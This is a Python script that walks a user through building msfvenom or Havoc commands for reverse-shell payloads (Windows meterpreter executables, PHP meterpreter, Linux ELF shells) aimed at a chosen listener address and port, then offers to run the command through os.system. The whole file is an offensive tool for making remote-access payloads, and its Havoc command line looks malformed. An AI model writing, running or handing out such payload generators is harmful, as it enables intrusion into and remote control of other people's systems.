import os

def generate_payload():
    # Ask for the framework
    framework = input("Select framework (1: Havoc, 2: msfvenom): ")

    if framework not in ["1", "2"]:
        print("Invalid selection.")
        return
    
    # Ask for OS
    os_choice = input("Enter the target OS (windows/linux): ").lower()

    if os_choice not in ["windows", "linux"]:
        print("Invalid OS selection.")
        return

    # Variables needed for payloads
    lhost = input("Enter LHOST (Your local IP address): ")
    lport = input("Enter LPORT (Listening port): ")

    # For Windows, ask for architecture
    if os_choice == "windows":
        arch_choice = input("Enter architecture (x64/x86): ").lower()
        if arch_choice not in ["x64", "x86"]:
            print("Invalid architecture selection.")
            return

    # Ask for payload type (.php or .exe)
    if os_choice == "windows":
        file_type = input("Choose payload type (1: .exe, 2: .php): ")
        if file_type == "1":
            extension = "exe"
        elif file_type == "2":
            extension = "php"
        else:
            print("Invalid selection.")
            return
    elif os_choice == "linux":
        file_type = input("Choose payload type (1: .elf, 2: .php): ")
        if file_type == "1":
            extension = "elf"
        elif file_type == "2":
            extension = "php"
        else:
            print("Invalid selection.")
            return

    # Payload generation based on framework and OS
    if framework == "1":
        print("\nSelected: Havoc Framework")
        if os_choice == "windows":
            payload = f"Havoc Generate --arch {arch_choice} --os windows --lhost {lhost} --lport {lport}"
        else:
            payload = f"Havoc Generate --arch x64 --os linux --lhost {lhost} --lport {lport}"

    else:
        print("\nSelected: msfvenom")
        if os_choice == "windows":
            if extension == "exe":
                payload = f"msfvenom -p windows/{arch_choice}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe"
            else:
                payload = f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw"
        else:
            if extension == "elf":
                payload = f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf"
            else:
                payload = f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw"

    # Ask for output filename
    output_name = input("\nEnter the name of the output file (without extension): ")
    
    # Add the file extension
    payload += f" -o {output_name}.{extension}"

    print(f"\nGenerated command: {payload}")
    
    # Execute the command if desired
    execute = input("\nDo you want to run the command now? (y/n): ").lower()
    if execute == "y":
        os.system(payload)

if __name__ == "__main__":
    generate_payload()

